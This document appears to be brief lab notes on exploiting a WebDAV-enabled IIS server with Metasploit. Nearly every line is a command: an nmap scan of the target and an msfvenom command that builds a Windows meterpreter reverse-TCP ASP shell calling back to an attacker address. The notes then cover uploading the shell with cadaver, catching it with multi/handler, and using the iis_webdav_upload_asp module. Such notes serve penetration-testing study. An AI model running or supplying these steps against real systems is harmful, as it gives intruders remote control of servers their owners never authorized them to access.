#### Exploiting webdav with metasploit
- nmap -sV -p 80 --script=http-enum 10.2.30.223
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp >shell.asp [this will create a reverse asp shell in attacker current directory]
- now we use cadaver to upload this shell [ cadaver http://10.2.30.223 ]
- put /root/shell.asp
- now we go to browser http://10.2.30.223/webdav this will lists all the files in webdav.We can execute the files but before executing we will start msfconsole and multi handler
- service postgresql start
- use multi/handler
- set payload windows/meterpreter/reverse_tcp [ use the same payload which also used for generating msfvenom shell ]
- show options
- set LHOST and LPORT [ which host and port also used for generating shell]
- run
- now go to the browser and click the uplaoded shell.This will give meterpreter shell.

#### using msf module
- search iis upload
- use exploit/windows/iis/iis_webdav_upload_asp
- now we need to set username,password,host, port,path,payloads also
